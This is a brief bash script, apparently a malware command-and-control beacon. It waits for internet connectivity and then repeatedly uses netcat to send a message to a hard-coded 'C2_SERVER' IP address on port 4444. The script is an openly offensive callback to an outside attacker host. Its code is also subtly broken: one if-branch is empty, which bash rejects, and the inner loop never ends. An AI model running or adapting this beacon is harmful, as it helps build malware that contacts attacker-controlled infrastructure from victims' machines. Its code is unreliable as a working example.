#!/bin/bash

C2_SERVER="20.100.13.164"
C2_PORT="4444"

while true; do
    ping -c 1 -W 5 8.8.8.8 > /dev/null 2>&1

    if [ $? -eq 0 ]; then
    
        while true; do
            echo "Successful netcat session established lets get to work!" | nc -w 3 $C2_SERVER $C2_PORT
            
            if [ $? -eq 0 ]; then
            else
                sleep 3
            fi
        done
    else
        sleep 5
    fi
done
